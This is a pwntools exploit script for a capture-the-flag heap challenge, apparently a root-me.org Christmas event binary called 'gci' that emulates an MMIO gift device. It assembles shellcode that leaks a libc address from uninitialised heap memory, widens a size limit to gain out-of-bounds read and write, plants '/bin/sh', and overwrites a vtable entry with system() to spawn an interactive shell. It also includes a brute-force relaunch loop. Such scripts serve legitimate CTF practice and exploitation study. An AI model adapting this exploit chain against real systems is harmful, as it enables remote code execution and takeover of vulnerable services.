from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = './gci'
exe_args = []
PREFIX = b": "
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    io = remote('dyn-01.xmas.root-me.org', 26211)

def launch_docker():
    global file, io
    io = remote("localhost", 26211)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", file], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF('libc.so.6')

GCI_MMIO = 0xcafe0000

GCI_CTRL_GIFT     = 0x00
GCI_CTRL_GIFT_MAX = 0x08
GCI_CTRL_GIFT_IDX = 0x10
GCI_CTRL_CMD      = 0x18

GCI_CMD_INIT      = 0x1337
GCI_CMD_ADD_GIFT  = 0x1338
GCI_CMD_GET_GIFT  = 0x1339
GCI_CMD_EDIT_GIFT = 0x1340
GCI_CMD_SUBMIT    = 0x1341

tries = 0
def exploit():
    def set_gift_max(value):
        return f"""
mov rax, {GCI_MMIO+GCI_CTRL_GIFT_MAX}
mov qword ptr [rax], {value}
"""
    def set_index(value):
        return f"""
mov rax, {GCI_MMIO+GCI_CTRL_GIFT_IDX}
mov qword ptr [rax], {value}
"""
    def set_gift(value):
        return f"""
mov rax, {GCI_MMIO+GCI_CTRL_GIFT}
mov qword ptr [rax], {value}
"""
    def get_gift(out):
        return f"""
mov rax, {GCI_MMIO+GCI_CTRL_GIFT}
mov {out}, qword ptr [rax]
"""
    def gift_cmd(ctrl):
        return f"""
mov rax, {GCI_MMIO+GCI_CTRL_CMD}
mov qword ptr [rax], {ctrl}
"""
    def malloc():
        return gift_cmd(GCI_CMD_INIT)
    def edit(idx, value):
        return set_index(idx) + set_gift(value) + gift_cmd(GCI_CMD_EDIT_GIFT)
    def show(idx, out):
        return set_index(idx) + gift_cmd(GCI_CMD_GET_GIFT) + get_gift(out)
    def add(value):
        return set_gift(value) + gift_cmd(GCI_CMD_ADD_GIFT)
    def quit():
        return gift_cmd(GCI_CMD_SUBMIT)    

    # r11 = LIBC BASE

    # allocate from unsorted -> uninitialized malloc -> fd leak -> libc leak
    # allocate 0x2a0 -> will allocate from our old code chunk, which is behind the allocated unicorn struct
    # alloc, then modify gift_maxwith big value -> oob read/write
    # write /bin/sh at the beginning of the unicorn struct
    # replace a vtable entry with system
    # shell

    payload = f"""
{set_gift_max(0x6b8//4)}
{malloc()}

{show(0, "rdi")}
{show(1, "rsi")}

shl rsi, 32
mov r11, rdi
or r11, rsi
sub r11, {0x203fc0}



{set_gift_max(0x298//4)}
{malloc()}
movabs rcx, 0xffffffff
{set_gift_max("rcx")}


movabs rcx, 0x0068732f6e69622f
{edit(0xa8, "rcx")}
ror rcx, 32
{edit(0xa9, "rcx")}


mov rcx, r11
add rcx, {libc.sym.system}
{edit(0xec, "rcx")}
"""
    
    payload = asm(payload).ljust(0x298, b"\0")
    choice(len(payload))
    saprefix(payload)

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        count = 0
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
